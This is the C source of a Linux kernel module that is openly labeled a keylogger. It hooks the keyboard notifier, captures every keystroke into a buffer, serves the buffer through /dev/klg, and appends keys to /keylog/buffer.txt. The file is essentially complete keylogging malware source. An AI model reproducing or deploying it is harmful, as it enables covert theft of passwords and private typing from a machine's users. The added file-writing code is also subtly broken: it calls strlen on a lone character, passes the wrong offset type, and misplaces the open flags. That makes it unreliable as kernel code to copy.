/* Necessary includes for device drivers */

#include <linux/kernel.h>
#include <asm/uaccess.h>
//stackoverflow includes start
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
//stackoverflow includes end
#include "klogger.h"


//stackoverflow code start
struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file* file) {
    filp_close(file, NULL);
}

int file_read(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}  

int file_write(struct file* file, unsigned long long offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file* file) {
    vfs_fsync(file, 0);
    return 0;
}
//stackoverflow code end

//my code start
void writeToFile(char* data)
{
    //first step is to open the file
    //use O_CREAT flag to create file if it doesn't exist
    struct file* file = file_open("/keylog/buffer.txt", O_APPEND, O_RDWR);
    int writeStatus = file_write(file, &file->f_pos, data, strlen(data));
    int syncStatus = file_sync(file);
    file_close(file);
    
}
//my code end

//original keylogger code
int klg_init(void) {
	int result;

	/* Registering device */
  	result = register_chrdev(KLG_MAJOR, "klg", &klg_fops);
  
	if (result < 0)
		return result;

	register_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);

	printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 

	return 0;
}

void klg_exit(void) {
	/* Freeing the major number */
	unregister_chrdev(KLG_MAJOR, "klg");

	unregister_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);
	bptr = buffer;

	printk(KERN_DEBUG "[Key logger]: Removing klg module\n");

}

int klg_open(struct inode *inode, struct file *filp) {

	printk(KERN_DEBUG "[Key logger]: Opening device\n");
	return 0;
}

ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 

	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");

	char* p = buffer;
	int bytes = 0;

	while(*p != '\0') {
		bytes++;
		p++;
	}

	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);

	if(bytes == 0 || *f_pos) return 0;

	int ret = copy_to_user(buf, buffer, bytes);

	if(ret) {
		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");
		return -EFAULT;
	}

	*f_pos = 1;

	return bytes;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
	struct keyboard_notifier_param *param = _param;

	if(code == KBD_KEYCODE && param->down) {
		if(param-> value == KEY_BACKSPACE) {
			if(bptr != buffer) {
                //increment backspace counter
				--bptr;
				*bptr = '\0';
			}
		}
		else {
			char ch = get_ascii(param->value);
            //ignore 'X' values here??? klg uses tolower values...backspace represented by X?
            
			if(ch != 'X') {
                //increment character counter here
                //try to write to file:
                writeToFile(&ch);
				*bptr = ch;
				bptr++;
				if(bptr == endptr) bptr = buffer;
			}
		}
	}

	return NOTIFY_OK;
}

MODULE_LICENSE("Dual BSD/GPL");

module_init(klg_init);
module_exit(klg_exit);

